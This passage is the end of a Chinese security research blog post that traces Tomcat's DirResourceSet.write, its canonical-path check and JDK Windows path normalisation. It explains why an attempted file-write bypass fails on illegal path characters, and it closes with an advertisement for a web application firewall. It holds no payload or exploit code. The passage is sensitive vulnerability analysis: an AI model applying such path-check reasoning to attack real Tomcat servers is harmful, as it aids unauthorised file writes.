+   }</code></pre><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="caret-color: red;font-size: 15px;">DirResourceSet.write 的源码为：</span><br/></p><pre style="box-sizing: inherit;margin-top: 1em;margin-bottom: 1em;padding: 10px;overflow: auto;font-size: 14px;word-wrap: normal;background-color: rgb(235, 238, 245);border-radius: 4px;"><code class="language-text" style="box-sizing: inherit;">   @Override
+   public boolean write(String path, InputStream is, boolean overwrite) {
+       checkPath(path);
+       if (is == null) {
+           throw new NullPointerException(
+                   sm.getString("dirResourceSet.writeNpe"));
+       }
+       if (isReadOnly()) {
+           return false;
+       }
+       File dest = null;
+       String webAppMount = getWebAppMount();
+       if (path.startsWith(webAppMount)) {
+           // 进入 file 方法
+           dest = file(path.substring(webAppMount.length()), false);</code></pre><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="caret-color: red;font-size: 15px;">file 方法：</span><br/></p><pre style="box-sizing: inherit;margin-top: 1em;margin-bottom: 1em;padding: 10px;overflow: auto;font-size: 14px;word-wrap: normal;background-color: rgb(235, 238, 245);border-radius: 4px;"><code class="language-text" style="box-sizing: inherit;">   protected final File file(String name, boolean mustExist) {
+           ...
+           String canPath = null;
+           try {
+               canPath = file.getCanonicalPath();
+           } catch (IOException e) {
+               // Ignore
+           }
+           ...
+           if ((absoluteBase.length() &lt; absPath.length())
+               &amp;&amp; (canonicalBase.length() &lt; canPath.length())) {
+               ...
+               if (!canPath.equals(absPath))
+                   return null;
+           }
+       } else {
+           return null;
+       }
+       return file;
+   }</code></pre><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="caret-color: red;font-size: 15px;">换汤不换药，为什么不能触发呢？经过单步，发现成功通过判断，但是在文件复制的时候出现了问题：</span><br/></p><pre style="box-sizing: inherit;margin-top: 1em;margin-bottom: 1em;padding: 10px;overflow: auto;font-size: 14px;word-wrap: normal;background-color: rgb(235, 238, 245);border-radius: 4px;"><code class="language-text" style="box-sizing: inherit;">   try {
+       if (overwrite) {
+           Files.copy(is, dest.toPath(), StandardCopyOption.REPLACE_EXISTING); // 此处
+       } else {
+           Files.copy(is, dest.toPath());
+       }
+   } catch (IOException ioe) {
+       return false;
+   }</code></pre><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="caret-color: red;font-size: 15px;">在 toPath 方法的时候出现了问题：</span><br/></p><pre style="box-sizing: inherit;margin-top: 1em;margin-bottom: 1em;padding: 10px;overflow: auto;font-size: 14px;word-wrap: normal;background-color: rgb(235, 238, 245);border-radius: 4px;"><code class="language-text" style="box-sizing: inherit;">   public Path toPath() {
+       Path result = filePath;
+       if (result == null) {
+           synchronized (this) {
+               result = filePath;
+               if (result == null) {
+                   result = FileSystems.getDefault().getPath(path);
+                   filePath = result;
+               }
+           }
+       }
+       return result;
+   }</code></pre><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;"><img width="998" class="origin_image zh-lightbox-thumb lazy" style="caret-color: red;box-sizing: inherit;overflow: hidden;display: block;margin: 0.72em auto;cursor: -webkit-zoom-in;" data-src="http://mmbiz.qpic.cn/mmbiz_jpg/FOh11C4BDicSkiaHurweibpmicU8hGjh1TIPUPubjz39qTEusLf95ricEKHMicu9V4LuAibOpib8Zs1Tau1m9ts7Lo8CkA/0?wx_fmt=jpeg" data-ratio="0.24166666666666667" data-type="jpeg" data-w="600" src="../Images/e16238517d21abd27940e90285397a8a.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/FOh11C4BDicSkiaHurweibpmicU8hGjh1TIPUPubjz39qTEusLf95ricEKHMicu9V4LuAibOpib8Zs1Tau1m9ts7Lo8CkA/0?wx_fmt=jpeg"/></p><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="caret-color: red;font-size: 15px;">WindowsPathParser.normalize 判断是是不是非法的字符：</span><br/></p><pre style="box-sizing: inherit;margin-top: 1em;margin-bottom: 1em;padding: 10px;overflow: auto;font-size: 14px;word-wrap: normal;background-color: rgb(235, 238, 245);border-radius: 4px;"><code class="language-text" style="box-sizing: inherit;">   private static String normalize(StringBuilder sb, String path, int off) {
+       ...
+       while (off &lt; len) {
+           char c = path.charAt(off);
+           if (isSlash(c)) {
+               if (lastC == ' ')
+                   throw new InvalidPathException(path,
+                                                  "Trailing char &lt;" + lastC + "&gt;",
+                                                  off - 1);
+           ...
+           } else {
+               if (isInvalidPathChar(c))
+                   throw new InvalidPathException(path,
+                                                  "Illegal char &lt;" + c + "&gt;",
+                                                  off);
+               lastC = c;
+               off++;
+           }
+       }
+       if (start != off) {
+           if (lastC == ' ')
+               throw new InvalidPathException(path,
+                                              "Trailing char &lt;" + lastC + "&gt;",
+                                              off - 1);
+           sb.append(path, start, off);
+       }
+       return sb.toString();
+   }</code></pre><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-align: justify;text-indent: 2em;"><span style="caret-color: red;font-size: 15px;">以及：</span><br/></p><pre style="box-sizing: inherit;margin-top: 1em;margin-bottom: 1em;padding: 10px;overflow: auto;font-size: 14px;word-wrap: normal;background-color: rgb(235, 238, 245);border-radius: 4px;"><code class="language-text" style="box-sizing: inherit;">   private static final boolean isInvalidPathChar(char var0) {
+       return var0 &lt; ' ' || "&lt;&gt;:\"|?*".indexOf(var0) != -1;
+   }</code></pre><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="caret-color: red;font-size: 15px;">难过。</span><br/></p><p style="text-align: justify;text-indent: 2em;"><span style="font-size: 15px;">本文首发于知乎-长亭技术专栏，欢迎关注与留言讨论。<br/></span></p></section></section><p><br/></p><p><br/></p><section class="_135editor" style="border-width: 0px;border-style: none;border-color: initial;box-sizing: border-box;" data-id="89715" data-tools="135&#x7F16;&#x8F91;&#x5668;"><section style="text-align:center;"><section style="display:inline-block;width:30px;"><img title="分割线  箭头 动态" style="width: 30px;display: inline;" data-src="http://mmbiz.qpic.cn/mmbiz_gif/FOh11C4BDicSkiaHurweibpmicU8hGjh1TIPibMhAaVhicuz4IWx8hOq0aHaxmUwt2GuxNFAh1AOpCTZWH3kFy7DRvcA/0?wx_fmt=gif" data-ratio="1.345" data-type="gif" data-w="200" src="../Images/841f7fdfdea1bf819e61f001f1e8b02c.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_gif/FOh11C4BDicSkiaHurweibpmicU8hGjh1TIPibMhAaVhicuz4IWx8hOq0aHaxmUwt2GuxNFAh1AOpCTZWH3kFy7DRvcA/0?wx_fmt=gif"/></section></section></section><p><br/></p><p style="text-indent: 2em;"><span style="max-width: 100%;color: rgb(127, 127, 127);text-align: justify;widows: 1;text-indent: 28px;font-size: 15px;letter-spacing: 1px;">保护企业级用户应用层安全，防止网络犯罪攻击，请戳入小程序，申请试用-</span><strong style="max-width: 100%;text-align: justify;white-space: normal;widows: 1;text-indent: 28px;color: rgb(62, 62, 62);font-size: 15px;letter-spacing: 1px;">雷池（SafeLine）下一代Web应用防火墙。</strong></p><p style="text-indent: 2em;"><strong style="max-width: 100%;text-align: justify;white-space: normal;widows: 1;text-indent: 28px;color: rgb(62, 62, 62);font-size: 15px;letter-spacing: 1px;"><br/></strong></p><p style="text-indent: 2em;"><strong style="max-width: 100%;text-align: justify;white-space: normal;widows: 1;text-indent: 28px;color: rgb(62, 62, 62);font-size: 15px;letter-spacing: 1px;"/></p><p style="text-align: center;"><a class="weapp_image_link" data-miniprogram-appid="wx40d601fff0d3c662" data-miniprogram-path="pages/wechat/index" data-miniprogram-nickname="长亭科技" href=""><img data-s="300,640" data-src="http://mmbiz.qpic.cn/mmbiz_jpg/Fuleibl6qMur4a1PU756cN4prq4n59mzOhUkNJeOQ1H39YnfuFapYuupgCOePpxQibmKTknOskG1lBPPwojzOOZg/0?wx_fmt=jpeg" style="" data-type="jpeg" class="" data-ratio="0.6625" data-w="2000" src="../Images/4f6cf6c9a9910e88486bc28a9381fbe0.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/Fuleibl6qMur4a1PU756cN4prq4n59mzOhUkNJeOQ1H39YnfuFapYuupgCOePpxQibmKTknOskG1lBPPwojzOOZg/0?wx_fmt=jpeg"/></a></p><p style="text-indent: 2em;"><br/></p>
+        
+</body>
+</html>
